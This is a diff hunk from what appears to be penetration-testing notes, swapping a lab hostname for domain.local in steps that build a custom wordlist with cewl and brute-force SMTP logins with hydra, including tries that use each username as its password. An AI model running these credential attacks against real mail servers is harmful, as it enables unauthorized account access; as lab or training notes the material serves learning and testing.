@@ -49,15 +49,15 @@ Now, validate them by running smtp-user-enum, then add the users found in a vali
 
 Create a custom wordlist if you find a lot of content in a web app
 
-    cewl -d 5 -m 3 http://postfish.off/team.html -w /home/kali/Desktop/cewl.txt
+    cewl -d 5 -m 3 http://domain.local/team.html -w /home/kali/Desktop/cewl.txt
 
 Attack with Hydra (SMTP/IMAP/POP3 protocols)
 
-    hydra -L validusers.txt -P cewl.txt postfish.off smtp 
+    hydra -L validusers.txt -P cewl.txt domain.local smtp 
 
 If no valid credentials are found, make the attack again using the username as the password.
 
-    hydra -L validusers.txt -P cewl.txt postfish.off smtp -e ns
+    hydra -L validusers.txt -P cewl.txt domain.local smtp -e ns
 
 Login with credentials
 
